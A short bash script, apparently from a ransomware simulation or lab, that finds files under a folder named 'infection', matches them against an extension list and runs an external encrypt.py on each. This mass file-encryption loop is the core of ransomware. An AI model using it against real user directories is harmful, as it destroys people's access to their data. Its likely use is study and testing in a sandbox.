#!/bin/bash

for file in $(find $HOME/infection -type f)
do
	for ex in $(cat /code/extensions)
	do
		if [[ "$file" =~ "$ex"$ ]]
		then
			python3 encrypt.py $file $1 $2
		fi
	done
done
